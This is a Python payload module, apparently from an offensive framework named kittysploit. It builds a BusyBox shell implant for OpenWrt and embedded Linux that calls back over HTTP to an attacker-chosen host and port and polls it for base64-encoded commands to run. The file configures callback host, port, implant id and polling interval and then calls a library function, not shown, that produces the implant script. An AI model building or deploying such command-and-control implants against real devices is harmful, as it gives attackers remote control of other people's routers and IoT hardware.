from kittysploit import *
from lib.c2.embedded_http_agent import build_embedded_http_agent_script
from lib.c2.embedded_session import EmbeddedC2Mixin
import uuid


class Module(Payload, EmbeddedC2Mixin):

    CLIENT_LANGUAGE = "sh"

    __info__ = {
        "name": "BusyBox Embedded HTTP Polling C2",
        "description": (
            "POSIX/BusyBox ash HTTP polling implant for OpenWrt and embedded Linux. "
            "Pairs with listeners/multi/reverse_http_polling (base64 command protocol)."
        ),
        "category": PayloadCategory.CMD,
        "arch": Arch.CMD,
        "platform": Platform.LINUX,
        "listener": "listeners/multi/reverse_http_polling",
        "handler": Handler.REVERSE,
        "session_type": SessionType.POLLING,
        "tags": ["iot", "busybox", "openwrt", "c2", "embedded"],
    }

    lhost = OptString("127.0.0.1", "Callback host reachable from the device", True)
    lport = OptPort(8088, "Callback HTTP polling port", True)
    url_prefix = OptString("/c2", "URL prefix (must match listener)", False)
    client_id = OptString("", "Implant id (auto if empty)", False)
    poll_interval = OptInteger(10, "Base poll interval seconds", False)
    ssl = OptBool(False, "Use HTTPS", False)

    def generate(self):
        cid = str(self.client_id or "").strip() or f"emb-{uuid.uuid4().hex[:8]}"
        return build_embedded_http_agent_script(
            str(self.lhost),
            int(self.lport),
            cid,
            url_prefix=str(self.url_prefix or "/c2"),
            poll_interval=float(self.poll_interval or 10),
            use_ssl=bool(self.ssl),
        )
